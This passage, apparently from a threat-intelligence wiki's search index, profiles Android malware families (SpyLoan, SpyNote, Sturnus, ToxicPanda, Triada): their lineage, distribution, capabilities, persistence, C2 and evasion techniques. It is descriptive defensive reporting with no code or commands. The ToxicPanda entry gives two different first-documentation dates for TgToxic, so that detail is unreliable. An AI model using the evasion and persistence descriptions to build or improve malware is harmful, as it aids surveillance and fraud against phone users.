objective.</p>"},{"location":"malware/families/spyloan/","title":"SpyLoan","text":"<p>SpyLoan is a class of predatory loan applications that function as spyware, collecting excessive personal data for harassment and extortion of borrowers. McAfee documented the global threat in November 2024, identifying 15 apps with 8 million+ combined installs on Google Play and a 75% increase in SpyLoan infections between Q2 and Q3 2024. ESET published earlier research documenting the phenomenon across Latin America and Southeast Asia. SpyLoan represents a distinct threat category: the apps are not traditional trojans stealing banking credentials but rather predatory financial tools that weaponize harvested personal data against their own users.</p>"},{"location":"malware/families/spyloan/#overview","title":"Overview","text":"Attribute Details First Seen 2020 (growing trend) Last Seen Active (increasing volume) Status Active, expanding globally Type Predatory loan app, spyware, extortionware Attribution Multiple independent operators, often linked to unlicensed fintech companies Aliases Loan Shark apps, Predatory Lending Malware"},{"location":"malware/families/spyloan/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/SpyLoan ESET Android/SpyLoan Kaspersky HEUR:Trojan.AndroidOS.SpyLoan Bitdefender Android.Trojan.SpyLoan"},{"location":"malware/families/spyloan/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SpyLoan is not a single malware family but a category of predatory apps from multiple independent operators. The apps share common characteristics: they offer quick personal loans through seemingly legitimate financial apps on Google Play, then use the excessive permissions and collected data to harass borrowers into repaying at extortionate interest rates. The operators are frequently linked to unlicensed fintech companies operating from China, India, and Southeast Asia.</p> <p>Unlike banking trojans that steal credentials covertly, SpyLoan apps collect data openly through permission requests that appear reasonable for a \"financial app\" (contacts for \"references,\" camera for \"ID verification,\" location for \"credit scoring\"). The data is then weaponized if the borrower fails to repay or disputes terms.</p>"},{"location":"malware/families/spyloan/#distribution","title":"Distribution","text":"Vector Details Google Play Primary distribution, apps pass review as legitimate loan platforms Third-party stores Additional distribution through regional app stores Social media ads Facebook, Instagram, and TikTok advertisements targeting users needing quick loans <p>SpyLoan apps achieve high install counts because they present as legitimate financial services and target users in genuine financial need. The apps typically offer instant approval for personal loans with minimal documentation.</p>"},{"location":"malware/families/spyloan/#capabilities","title":"Capabilities","text":"Capability Description Contact harvesting Uploads full contact list for harassment of borrower's social circle SMS access Reads all SMS messages, extracts financial information Call log theft Exfiltrates call history Photo/media access Accesses device photos, potentially used for extortion Camera access Captures selfies during \"identity verification,\" stored for intimidation Location tracking GPS tracking of borrowers Device info IMEI, installed apps, account information Notification access Monitors financial notifications"},{"location":"malware/families/spyloan/#extortion-model","title":"Extortion Model","text":"<p>The data collection feeds a harassment and extortion operation:</p> <ol> <li>User downloads app and applies for a loan</li> <li>App collects contacts, photos, SMS, location during \"verification\"</li> <li>Loan is approved at predatory interest rates (often 100%+ APR)</li> <li>If borrower misses payment or disputes terms:<ul> <li>Contacts receive threatening messages claiming the borrower owes money</li> <li>Personal photos may be shared with contacts</li> <li>Threatening calls to borrower and their contacts</li> <li>Fake legal threats sent to borrower's workplace</li> </ul> </li> </ol> <p>This model has caused documented cases of suicide in India and other countries, leading to regulatory action in multiple jurisdictions.</p>"},{"location":"malware/families/spyloan/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spyloan/#permission-abuse","title":"Permission Abuse","text":"<p>SpyLoan apps request permissions under the guise of financial verification:</p> Permission Stated Reason Actual Use READ_CONTACTS \"Loan references\" Harassment contact list READ_SMS \"Income verification\" Financial data mining CAMERA \"ID photo verification\" Intimidation material ACCESS_FINE_LOCATION \"Address verification\" Physical intimidation READ_CALL_LOG \"Employment verification\" Social network mapping READ_EXTERNAL_STORAGE \"Document upload\" Photo/document theft"},{"location":"malware/families/spyloan/#data-exfiltration","title":"Data Exfiltration","text":"<ul> <li>All collected data uploaded to operator servers immediately upon permission grant</li> <li>Data retained even if the user never completes a loan application</li> <li>Server-side storage enables data use even after app uninstallation</li> <li>Some operators sell harvested data to additional extortion operations</li> </ul>"},{"location":"malware/families/spyloan/#target-regions","title":"Target Regions","text":"Region Details India Largest market, regulatory crackdown ongoing Southeast Asia Philippines, Indonesia, Thailand Latin America Mexico, Colombia, Peru, Chile Africa Kenya, Nigeria, Tanzania South Asia Pakistan, Bangladesh <p>McAfee's research documented the 75% infection increase primarily in South America, Southern Asia, and Africa, regions where access to formal banking is limited and demand for quick loans is high.</p>"},{"location":"malware/families/spyloan/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020-2022: SpyLoan apps emerge across Google Play targeting users in India and Southeast Asia. Multiple reports of harassment and extortion surface.</p> <p>2023: ESET publishes research on predatory lending apps documenting the global spread and the social engineering techniques used to obtain excessive permissions.</p> <p>2024, November: McAfee documents the global scope: 15 active apps with 8M+ installs, 75% increase in infections Q2-Q3 2024. Google removes identified apps but new variants continue to appear.</p>"},{"location":"malware/families/spynote/","title":"SpyNote","text":"<p>SpyNote is a freely available Android Remote Access Trojan (RAT) builder that has been circulating on underground forums since 2016. Its significance comes not from technical sophistication but from accessibility: anyone with basic technical skills can generate a fully functional Android implant capable of camera access, microphone recording, keylogging, SMS interception, and real-time location tracking. The builder's source code was leaked publicly in October 2022, causing an immediate surge in deployments. Since then, SpyNote has been repurposed beyond its original RAT functionality into a banking trojan with overlay attack capabilities, targeting financial institutions across Europe and beyond.</p>"},{"location":"malware/families/spynote/#overview","title":"Overview","text":"Attribute Details First Seen July 2016 Status Active, large and growing sample count Type Remote Access Trojan (RAT), banking trojan (later variants) Attribution Original author unknown; CypherRat variant sold by a developer via Telegram before source leak Aliases SpyNote, SpyMax, CypherRat (commercial variant), SpyNote.C Platform Android"},{"location":"malware/families/spynote/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Palo Alto Networks' Unit 42 first documented SpyNote in July 2016 after the builder appeared on underground forums. The tool provided a Windows-based GUI application that generated customized Android APKs with embedded RAT functionality. At the time, it was comparable to DroidJack and OmniRat, other Android RAT builders.</p> <p>SpyNote evolved through several versions:</p> Version Period Key Change SpyNote v1-v5 2016-2020 Basic RAT, free distribution on forums SpyNote v6 / CypherRat 2021-2022 Enhanced version sold via Telegram by a developer using cryptocurrency payments through Sellix. Added banking capabilities, accessibility abuse, and overlay attacks SpyNote.C (post-leak) October 2022-present CypherRat source code leaked on GitHub after scamming incidents in hacking forums. Mass adoption by independent operators <p>The October 2022 source code leak was the inflection point. ThreatFabric documented that after the leak, SpyNote sample counts increased dramatically as actors worldwide began compiling their own builds. The malware went from a niche RAT to one of the most commonly encountered Android threats.</p>"},{"location":"malware/families/spynote/#distribution","title":"Distribution","text":"<p>SpyNote payloads reach targets through multiple low-cost channels. There is no centralized Malware-as-a-Service operation: each operator handles their own distribution.</p> Vector Details Smishing SMS messages with links to fake app download pages. Messages typically impersonate banks, delivery services, or system updates Phishing sites Fake websites impersonating Google Play Store, banking apps, or popular applications Trojanized APKs SpyNote payloads bundled with or disguised as legitimate apps, distributed through third-party app stores and file-sharing sites Social engineering Manual distribution through social media, messaging apps, or targeted messages Fake banking apps Cleafy documented campaigns where SpyNote was distributed as fake banking apps from major European institutions <p>Because the builder is free and requires no technical backend, the distribution channels are as varied as the operators. Some campaigns target specific banks in specific countries; others cast a wide net with generic lures.</p>"},{"location":"malware/families/spynote/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/spynote/#core-rat-functionality","title":"Core RAT Functionality","text":"<p>SpyNote's base capabilities have remained consistent across versions:</p> Capability Implementation Camera Activate front and rear cameras for photo and video capture Microphone Record ambient audio, record phone calls Keylogging Capture keystrokes via accessibility service SMS Read, intercept, and send SMS messages (2FA bypass) Call log Exfiltrate call history Contacts Steal contact list Location Real-time GPS tracking File manager Browse, download, upload, and delete files on device storage App management Install, uninstall, and list applications Screen capture Record screen using MediaProjection API Clipboard Monitor and capture clipboard contents Notifications Intercept notifications via NotificationListenerService Device info Collect IMEI, model, OS version, network info, battery status Remote shell Execute commands on the device"},{"location":"malware/families/spynote/#banking-trojan-extensions-cypherrat-spynotec","title":"Banking Trojan Extensions (CypherRat / SpyNote.C)","text":"<p>ThreatFabric's analysis documented the banking capabilities added in the CypherRat variant:</p> Capability Implementation Overlay attacks Display fake login screens over targeted banking and cryptocurrency apps 2FA interception Intercept SMS OTPs and capture authenticator app codes via accessibility Credential theft Harvest credentials from overlay injects and keylogger data Automated actions Use accessibility to perform actions within banking apps on behalf of the attacker Target list Impersonates major financial institutions including HSBC, Deutsche Bank, Kotak Bank, Nubank, and others"},{"location":"malware/families/spynote/#targeted-applications","title":"Targeted Applications","text":"<p>Cleafy documented SpyNote campaigns targeting:</p> Category Examples Banking HSBC, Deutsche Bank, Kotak Bank, Nubank, various European and Asian banks Cryptocurrency Wallet apps, exchange apps Social media WhatsApp, Facebook, Instagram Email Gmail, Outlook Payment Google Pay, PayPal"},{"location":"malware/families/spynote/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spynote/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>SpyNote's core functionality depends on the Android Accessibility Service. On first launch, the implant aggressively prompts the user to grant accessibility access through repeated dialogs. Once granted, the accessibility service enables:</p> <ul> <li>Keylogging across all applications</li> <li>Auto-granting of additional permissions without user interaction</li> <li>Overlay injection for credential theft</li> <li>Prevention of uninstallation (intercepts attempts to open settings or uninstall the app)</li> <li>Automatic re-enabling of accessibility if the user disables it</li> </ul>"},{"location":"malware/families/spynote/#persistence-and-anti-removal","title":"Persistence and Anti-Removal","text":"<p>SpyNote implements aggressive persistence techniques:</p> Technique Implementation Die-hard services Two background services (documented by F-Secure as \"die-hard services\") that monitor each other and restart if killed Anti-uninstall Accessibility service intercepts taps on uninstall dialogs and closes them, or navigates back to home screen Boot persistence <code>RECEIVE_BOOT_COMPLETED</code> receiver restarts services after reboot Battery optimization bypass Requests exemption from battery optimization to prevent the OS from killing background services Notification hiding Hides its notification or disguises it as a system notification <p>Removing SpyNote from an infected device often requires booting into safe mode or using ADB, because the accessibility service actively prevents normal uninstallation.</p>"},{"location":"malware/families/spynote/#c2-communication","title":"C2 Communication","text":"<p>SpyNote uses a custom TCP-based protocol to communicate with the operator's C2 server:</p> <ul> <li>Connection over raw TCP socket (default ports vary by build)</li> <li>Data serialized and transmitted in a custom binary format</li> <li>Operator uses the SpyNote desktop client (Windows) to view connected devices, issue commands, and receive data</li> <li>No relay infrastructure or proxy chains: the implant connects directly to the operator's server, making C2 infrastructure easy to identify but also trivially replaceable</li> </ul>"},{"location":"malware/families/spynote/#anti-analysis","title":"Anti-Analysis","text":"Technique Implementation Class name obfuscation All class names obfuscated in compiled builds Junk code Dead code paths inserted to slow static analysis Anti-emulator Checks for emulator properties (build strings, hardware characteristics, SIM state) and avoids execution in analysis environments String encryption Critical strings encrypted at compile time, decrypted at runtime <p>The obfuscation is moderate compared to commercial spyware like FinSpy. Most samples are analyzable with standard Android reverse engineering tools (jadx, Frida, APKTool) with moderate effort.</p>"},{"location":"malware/families/spynote/#builder-architecture","title":"Builder Architecture","text":"<p>The SpyNote builder is a Windows desktop application that generates Android APKs. The operator specifies:</p> <ul> <li>C2 server address and port</li> <li>App name, icon, and package name (for disguising the payload)</li> <li>Which permissions and capabilities to enable</li> <li>Whether to bind the payload to a legitimate APK</li> </ul> <p>The builder does not require Android development knowledge. The operator fills in configuration fields and clicks \"Build,\" producing a ready-to-deploy APK.</p>"},{"location":"malware/families/spynote/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Unlike commercial spyware with a defined client list, SpyNote is used by thousands of independent operators worldwide. Documented campaigns include:</p> Campaign/Context Targets Period Source European banking campaign Customers of major European banks (HSBC, Deutsche Bank) 2022-2023 ThreatFabric Italian banking targets Italian financial institutions 2023 Cleafy Cryptocurrency theft Crypto wallet users 2021-present Fortinet Generic RAT operations Individual targets (stalkerware, personal surveillance) 2016-present Various Natural disaster lures Users in regions affected by earthquakes and eruptions (social engineering) 2023 BleepingComputer <p>The majority of SpyNote deployments are never publicly reported. The free availability of the builder means it is used for everything from state-level operations in low-capability countries to individual stalkerware cases.</p>"},{"location":"malware/families/spynote/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>July 2016: Palo Alto Networks' Unit 42 publishes the first analysis of SpyNote after the builder leaks on underground forums. They note its similarity to DroidJack and OmniRat, warning that active attacks are likely imminent.</p> <p>2020-2021: SpyNote v6 evolves into CypherRat, sold through Telegram channels using cryptocurrency. The developer adds banking trojan features including overlay attacks and accessibility-based credential theft.</p> <p>October 2022: CypherRat source code is leaked on GitHub after scamming incidents between the developer and buyers on underground forums. The leak triggers a massive increase in SpyNote deployments worldwide.</p> <p>January 2023: ThreatFabric publishes \"SpyNote: Spyware with RAT capabilities targeting Financial Institutions\", documenting the evolution from simple RAT to banking trojan and the impact of the source code leak on the threat landscape.</p> <p>2023: Cleafy documents ongoing SpyNote campaigns targeting European financial institutions with increasingly sophisticated social engineering, including fake SMS messages directing users to install \"new certified banking apps.\"</p> <p>2023: SpyNote is distributed through fake volcano eruption alerts and earthquake warnings, exploiting natural disaster fears for social engineering.</p> <p>2023-present: F-Secure documents SpyNote's die-hard service architecture, detailing the anti-removal mechanisms that make the malware difficult to uninstall without ADB or safe mode access. SpyNote continues to rank among the most commonly detected Android RATs worldwide.</p> <p>September 2024, Gigabud infrastructure connection: Zimperium zLabs revealed that Gigabud (a banking credential stealer) and SpyNote share distribution infrastructure, suggesting coordination by a single threat actor group. The investigation identified 79 phishing sites, 11 C2 servers, and targeting of 50+ financial apps (40+ banks, 10 crypto platforms). Both families were protected by Virbox packer. This infrastructure overlap indicates SpyNote is being deployed alongside specialized banking credential stealers in coordinated campaigns rather than operating purely as a standalone RAT.</p>"},{"location":"malware/families/sturnus/","title":"Sturnus","text":"<p>Sturnus is a privately operated Android banking trojan discovered by ThreatFabric in November 2025. Unlike most modern Android banking malware sold as MaaS, Sturnus appears to be operated exclusively by its developers. Its most notable capability is the interception of content from encrypted messaging apps, including WhatsApp, Telegram, and Signal, by reading screen content via the Accessibility Service after messages are decrypted on-device. This technique completely sidesteps end-to-end encryption without needing to break any cryptographic protocol.</p>"},{"location":"malware/families/sturnus/#overview","title":"Overview","text":"Attribute Details First Seen November 2025 Status Active, in evaluation/tuning phase Type Banking trojan, device takeover Attribution Privately operated (not MaaS) Distribution Unknown (under investigation)"},{"location":"malware/families/sturnus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Sturnus has no known code lineage to existing Android banking trojan families. ThreatFabric's analysis identifies it as an independently developed project. The private operation model sets it apart from the dominant MaaS trend in the Android banking malware ecosystem, where families like Octo, Hook, and Medusa are rented to affiliates. Sturnus operators appear to control the full attack chain themselves, from development to deployment to fraud execution.</p> <p>At the time of discovery, ThreatFabric assessed Sturnus as being in an evaluation or tuning phase, suggesting the operators are refining their techniques before scaling operations.</p>"},{"location":"malware/families/sturnus/#distribution","title":"Distribution","text":"<p>Distribution vectors have not been publicly documented in detail. ThreatFabric's initial disclosure focused on the malware's post-installation capabilities rather than delivery mechanisms. Given the private operational model, distribution is likely targeted rather than broad, possibly through spear-phishing or social engineering campaigns directed at specific victims.</p>"},{"location":"malware/families/sturnus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/sturnus/#core-features","title":"Core Features","text":"Capability Implementation Encrypted message capture Reads screen content via Accessibility Service after decryption occurs on-device Device takeover Full remote control of infected devices Text injection Injects text into fields without physical interaction Screen blackout Blacks out device screen during fraud operations to hide activity Accessibility abuse Leverages Accessibility Service for screen reading, input simulation, and overlay detection"},{"location":"malware/families/sturnus/#encrypted-messaging-interception","title":"Encrypted Messaging Interception","text":"<p>The signature capability of Sturnus is its approach to capturing content from end-to-end encrypted messaging applications. Rather than attempting to break the encryption itself, Sturnus exploits a fundamental reality of encrypted messaging: messages must be decrypted on the device for the user to read them. Once decrypted and displayed on screen, the Accessibility Service can read the content just as it would read any other on-screen text.</p> <p>ThreatFabric documented that Sturnus targets:</p> <ul> <li>WhatsApp: Captures message content after rendering</li> <li>Telegram: Reads decrypted messages from the screen</li> <li>Signal: Intercepts displayed message content</li> </ul> <p>This technique is not a cryptographic attack. It is an on-device content capture that operates after the encryption layer has already done its job. The Accessibility Service provides a legitimate API for reading screen content, originally designed for assistive technology, and Sturnus repurposes it for surveillance. For more on how Android malware abuses this permission, see Accessibility Abuse.</p>"},{"location":"malware/families/sturnus/#device-takeover","title":"Device Takeover","text":"<p>Sturnus provides full device takeover capability, allowing operators to:</p> <ol> <li>Navigate the device remotely as if holding it</li> <li>Inject text into any input field without physical interaction</li> <li>Black out the device screen during fraud operations so the victim sees nothing</li> <li>Execute banking fraud while the device appears powered off or inactive</li> </ol> <p>The screen blackout technique is shared with other device takeover trojans like Octo and Hook, where the operator dims brightness to zero and displays a black overlay to mask remote activity.</p>"},{"location":"malware/families/sturnus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sturnus/#c2-communication","title":"C2 Communication","text":"<p>Technical details of Sturnus's C2 infrastructure have not been fully disclosed by ThreatFabric in the initial publication. Further technical indicators may emerge as the family matures beyond its current evaluation phase.</p>"},{"location":"malware/families/sturnus/#anti-analysis","title":"Anti-Analysis","text":"<p>As a privately operated trojan still in its tuning phase, detailed anti-analysis techniques have not yet been extensively documented. The private operation model itself serves as a form of evasion, as the limited sample distribution makes it harder for security vendors to obtain and analyze specimens compared to widely distributed MaaS families.</p>"},{"location":"malware/families/sturnus/#target-regions","title":"Target Regions","text":"Region Status Southern Europe Primary target region Central Europe Primary target region <p>ThreatFabric's report identifies Southern and Central Europe as the current target geography. The specific financial institutions targeted have not been publicly enumerated.</p>"},{"location":"malware/families/sturnus/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2025: ThreatFabric publishes the discovery of Sturnus, highlighting its ability to capture content from encrypted messaging apps by reading screen content via Accessibility Service. The trojan is assessed as being in an evaluation/tuning phase with a private operational model targeting Southern and Central European victims.</p>"},{"location":"malware/families/sturnus/#related-families","title":"Related Families","text":"<p>Sturnus joins a growing set of Android banking trojans with full device takeover capability. Octo pioneered accessible remote control through MediaProjection screen streaming. Hook built on the Cerberus/Ermac lineage to offer VNC-based remote access. Medusa combines screen streaming with keylogging. What distinguishes Sturnus is the explicit focus on encrypted messaging content capture, a capability that other families could theoretically implement but have not prioritized as a core feature.</p> <p>The encrypted messaging interception technique represents a broader trend in mobile malware: rather than attacking the encryption protocol, attackers target the endpoints where data exists in plaintext. This is the same principle behind SparkCat and SpyAgent stealing cryptocurrency seed phrases via OCR from device photos, targeting the moment when sensitive data is visible rather than when it is protected in transit.</p>"},{"location":"malware/families/toxicpanda/","title":"ToxicPanda","text":"<p>ToxicPanda is a banking trojan that emerged in late 2024, representing the geographic expansion of Chinese-speaking threat actors from Southeast Asian targets into European and Latin American financial institutions. Cleafy first identified the family in October 2024, initially associating it with TgToxic before determining it was a distinct, stripped-down variant with its own command set. Despite being in early development, the botnet grew rapidly to over 1,500 infected devices, with Italy accounting for more than half of all infections.</p>"},{"location":"malware/families/toxicpanda/#overview","title":"Overview","text":"Attribute Details First Seen October 2024 Last Seen Active (ongoing campaigns) Status Active, in early development, rapidly expanding Type Banking trojan Attribution Chinese-speaking threat actor(s), likely connected to TgToxic operators Aliases TgToxic variant Predecessor TgToxic (originally targeting Southeast Asia)"},{"location":"malware/families/toxicpanda/#vendor-names","title":"Vendor Names","text":"Vendor Name Cleafy ToxicPanda ThreatFabric ToxicPanda Trend Micro TgToxic / AndroidOS_TgToxic Intel 471 TgToxic ESET Android/Spy.Banker.TgToxic Kaspersky HEUR:Trojan-Banker.AndroidOS.TgToxic BitSight ToxicPanda"},{"location":"malware/families/toxicpanda/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ToxicPanda descends from TgToxic, an Android banking trojan that Trend Micro first documented in February 2023. TgToxic originally targeted users in Taiwan, Thailand, and Indonesia, focusing on cryptocurrency wallets and regional banking apps. Its distinguishing characteristic was abuse of the Easyclick legitimate test automation framework to script UI interactions for automated fraud.</p> <p>Cleafy's analysis determined that ToxicPanda shares 61 commands with TgToxic, confirming the same threat actor or close affiliates are behind both families. ToxicPanda is a stripped-down version of its predecessor: it removes TgToxic's Automatic Transfer System (ATS), Easyclick framework integration, and obfuscation routines, while introducing 33 new commands of its own. This simplification suggests the actors rebuilt the trojan for a new target region, prioritizing manual On-Device Fraud over TgToxic's automation.</p> <p>Intel 471 later tracked continued evolution of the TgToxic family in parallel, with updates adding domain generation algorithms (DGA) and dead drop resolvers using community forum profiles for C2 resilience.</p>"},{"location":"malware/families/toxicpanda/#distribution","title":"Distribution","text":"<p>ToxicPanda's distribution methods target individual banking customers through standard social engineering.</p> Vector Details Fake app pages Phishing sites mimicking Google Play or official bank app download pages Sideloading lures Social engineering to convince victims to install APKs outside official stores Third-party app stores APKs uploaded to unofficial Android markets <p>Cleafy noted that the distribution infrastructure appears less mature than established European MaaS operations, consistent with a threat actor expanding into an unfamiliar geographic region.</p>"},{"location":"malware/families/toxicpanda/#capabilities","title":"Capabilities","text":"<p>ToxicPanda focuses on manual On-Device Fraud (ODF) via accessibility, giving operators direct control of the victim device for real-time transaction manipulation.</p> Capability Implementation On-Device Fraud (ODF) Remote account takeover directly on the infected device via accessibility service OTP interception Intercepts one-time passwords from SMS and authenticator apps, bypassing 2FA Overlay attacks Credential phishing via overlay injection over target banking apps Remote control Manual device interaction through accessibility for navigating banking apps SMS interception Read and forward SMS messages for OTP capture App listing Enumerate installed applications to identify targets Device info collection Exfiltrate device fingerprint, SIM info, installed apps Screenshot capture Capture device screen state during fraud operations"},{"location":"malware/families/toxicpanda/#comparison-to-tgtoxic","title":"Comparison to TgToxic","text":"Feature TgToxic ToxicPanda ATS (Automated Transfer System) Present Removed Easyclick automation Present Removed Obfuscation routines Present Removed Manual ODF Limited Primary fraud method Shared commands 61 61 New commands N/A 33 Target region Southeast Asia Europe, Latin America <p>The removal of ATS and automation in favor of manual ODF indicates the operators are adapting to European banking security controls, which more aggressively detect automated transaction patterns. Manual fraud via remote access is harder for anti-fraud systems to distinguish from legitimate user behavior.</p>"},{"location":"malware/families/toxicpanda/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/toxicpanda/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>ToxicPanda's On-Device Fraud relies entirely on Android's accessibility service:</p> <ol> <li>Victim grants accessibility permission after social engineering</li> <li>Malware auto-grants additional permissions (SMS, phone)</li> <li>Operators connect to the device for interactive sessions</li> <li>Accessibility actions navigate banking apps, initiate transfers, and approve transactions</li> <li>OTP codes intercepted from SMS or captured from notification bar</li> </ol>"},{"location":"malware/families/toxicpanda/#c2-communication","title":"C2 Communication","text":"<p>ToxicPanda uses HTTP-based communication with its C2 infrastructure:</p> <ul> <li>Bot registers with device fingerprint on infection</li> <li>Retrieves target app list and configuration</li> <li>Operators issue commands for interactive fraud sessions</li> <li>Stolen credentials and OTPs exfiltrated to C2</li> </ul>"},{"location":"malware/families/toxicpanda/#tgtoxic-c2-evolution-parallel-development","title":"TgToxic C2 Evolution (Parallel Development)","text":"<p>While ToxicPanda uses relatively straightforward C2, the parent TgToxic family has evolved its infrastructure significantly. Intel 471 documented three phases:</p> Phase Technique Details Phase 1 Hardcoded domains C2 addresses embedded in malware configuration Phase 2 Dead drop resolvers Encrypted C2 addresses hidden in Atlassian community forum user profiles; malware selects a forum URL from configuration, retrieves the profile, and decrypts the C2 address Phase 3 DGA Domain generation algorithm creates dynamic C2 domains, discovered in December 2024 samples <p>The dead drop resolver technique extends sample lifespan: as long as the forum profile remains active, the C2 can be rotated without updating the malware. The DGA further increases resilience by generating multiple candidate domains that can be registered on demand.</p>"},{"location":"malware/families/toxicpanda/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Enhanced hardware and sensor checks in TgToxic variants Minimal obfuscation ToxicPanda specifically strips obfuscation, suggesting rapid deployment was prioritized over stealth Dynamic C2 Parent TgToxic uses DGA and dead drop resolvers for infrastructure resilience"},{"location":"malware/families/toxicpanda/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>ToxicPanda represents a notable geographic pivot, with Chinese-speaking actors targeting European and Latin American banks for the first time.</p> Region Share of Infections Details Italy 56.8% Largest concentration of infected devices, multiple Italian banks targeted Portugal 18.7% Second-largest infection base Hong Kong 4.6% Possible holdover from original TgToxic targeting Spain 3.9% Spanish banking institutions Peru 3.4% Latin American expansion <p>Cleafy identified 16 targeted banking institutions across these regions. BitSight's 2025 follow-up study showed the botnet continuing to grow, with Portugal and Spain becoming primary targets and the total device count more than doubling.</p> <p>The Chinese-speaking attribution is unusual for banking fraud operations targeting Europe and Latin America, a space traditionally dominated by Russian-speaking and Eastern European actors. This expansion suggests either a deliberate market entry by the TgToxic operators or a sale/sharing of the codebase with actors operating in these regions.</p>"},{"location":"malware/families/toxicpanda/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2022: Trend Micro first documents TgToxic targeting users in Taiwan, Thailand, and Indonesia via fake cryptocurrency and banking apps, using the Easyclick automation framework for credential theft and automated transactions.</p> <p>October 2024: Cleafy identifies ToxicPanda as an anomalous campaign initially attributed to TgToxic. Analysis reveals significant code differences, and Cleafy begins tracking it as a separate family. Over 1,500 infected devices identified across Italy, Portugal, Spain, Hong Kong, and Peru.</p> <p>November 2024: ToxicPanda receives broad coverage following Cleafy's publication. Security researchers note the unusual Chinese-speaking attribution for a European-focused banking trojan and the stripped-down nature compared to TgToxic.</p> <p>December 2024: Intel 471 discovers TgToxic variants incorporating DGA for C2 resilience, representing the third generation of C2 evasion techniques after hardcoded domains and dead drop resolvers.</p> <p>Early 2025: BitSight TRACE research reports the botnet has more than doubled in size, with Portugal and Spain overtaking Italy as primary infection targets. The geographic distribution continues to shift as the operators expand their European footprint.</p>"},{"location":"malware/families/triada/","title":"Triada","text":"<p>Triada is a system-level Android trojan that evolved from a sophisticated rooting malware into a supply chain threat pre-installed in the firmware of budget Android devices. First identified by Kaspersky in 2016, it was the first malware observed injecting code into the Android Zygote process, the parent from which every application forks. By 2017, Triada had shifted from post-sale infection to pre-installation: Google confirmed that a third-party vendor in the OEM supply chain was inserting Triada into system images before devices reached consumers. As of 2025, Kaspersky continues to find new Triada variants pre-installed on counterfeit smartphones sold through online marketplaces.</p>"},{"location":"malware/families/triada/#overview","title":"Overview","text":"Attribute Details First Seen March 2016 Status Active, new variants discovered in 2025 Type System-level trojan, supply chain backdoor Attribution Unknown threat actors; supply chain compromise attributed to a vendor using the name Yehuo or Blazefire (per Google) Aliases Triada, Backdoor.AndroidOS.Triada (Kaspersky), Android.Triada (Dr.Web) Platform Android"},{"location":"malware/families/triada/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky published the initial Triada analysis in March 2016, calling it the most advanced mobile trojan they had ever analyzed. At that time, Triada was a modular trojan that gained root access through known exploits and then injected itself into the Zygote process to persist across all applications. Its primary monetization was intercepting and modifying outgoing SMS messages for premium SMS fraud, redirecting payments from in-app purchases to attacker-controlled accounts.</p> <p>By 2017, the malware's delivery model changed entirely. Rather than exploiting devices post-sale, Triada began appearing pre-installed in the firmware of budget Android devices. Google's Android security team published their analysis in June 2019, confirming that a third-party vendor (identified as Yehuo or Blazefire) had injected Triada into system images provided to OEMs. When manufacturers outsourced the implementation of features not included in the Android Open Source Project (like face unlock), the contracted vendor returned system images with Triada embedded. Krebs on Security covered the supply chain implications in detail.</p> <p>The 2025 variant represents a further evolution. Kaspersky's April 2025 analysis found Triada (Backdoor.AndroidOS.Triada.z) pre-installed on counterfeit Android smartphones sold through online marketplaces, with over 4,500 infections detected worldwide. The threat actors had transferred approximately $270,000 in cryptocurrency through wallets linked to the operation between June 2024 and March 2025.</p>"},{"location":"malware/families/triada/#distribution","title":"Distribution","text":"<p>Triada's distribution model is distinct from virtually every other malware family: rather than tricking users into installing a malicious app, the malware is already present when the device is first powered on.</p>"},{"location":"malware/families/triada/#supply-chain-compromise","title":"Supply Chain Compromise","text":"Phase Method 2016 Post-sale rooting: exploits known kernel vulnerabilities to gain root, then injects into Zygote 2017-2019 OEM supply chain: third-party vendor inserts Triada into system images provided to budget phone manufacturers 2024-2025 Counterfeit devices: pre-installed in firmware of fake smartphones sold through online marketplaces <p>The supply chain infection occurs at a point in the manufacturing process where the OEM has contracted an outside vendor to customize the firmware. The vendor, either compromised or complicit, inserts Triada into the system partition before the image is flashed onto devices. Because Triada resides in the system partition, it cannot be removed through a factory reset.</p>"},{"location":"malware/families/triada/#which-devices","title":"Which Devices","text":"<p>Triada primarily targets budget Android devices from lesser-known manufacturers. These devices are sold through:</p> <ul> <li>Online marketplaces and e-commerce platforms</li> <li>Unauthorized retailers</li> <li>Markets in developing regions where budget Android phones are prevalent</li> </ul> <p>The 2025 campaign specifically targets counterfeit phones that visually imitate well-known brands but run modified firmware with Triada embedded.</p>"},{"location":"malware/families/triada/#capabilities","title":"Capabilities","text":"<p>Triada's capabilities have expanded significantly across its versions.</p>"},{"location":"malware/families/triada/#early-versions-2016","title":"Early Versions (2016)","text":"Capability Implementation Zygote injection Inject code into the Zygote process, gaining execution context in every newly launched application SMS hijacking Intercept and modify outgoing SMS messages to redirect premium SMS payments Ad fraud Inject advertising into applications and browsers Module loading Download and execute additional modules from C2"},{"location":"malware/families/triada/#supply-chain-versions-2017-2019","title":"Supply Chain Versions (2017-2019)","text":"Capability Implementation System-level persistence Installed in system partition, survives factory reset Backdoor access Remote command execution from C2 App installation Silently download and install additional APKs Data exfiltration Steal device identifiers, account information Ad injection Insert advertisements across applications Browser manipulation Redirect browser traffic, inject content"},{"location":"malware/families/triada/#current-versions-2024-2025","title":"Current Versions (2024-2025)","text":"<p>Kaspersky's 2025 analysis documents an expanded set of capabilities:</p> Capability Implementation Cryptocurrency theft Replace wallet addresses in clipboard to redirect crypto transactions SMS interception Read, send, and delete SMS messages (including OTP interception) Call manipulation Make calls and intercept incoming calls Browser hijacking Replace links in browsers, inject pages Messenger interception Extract messages and media from WhatsApp, 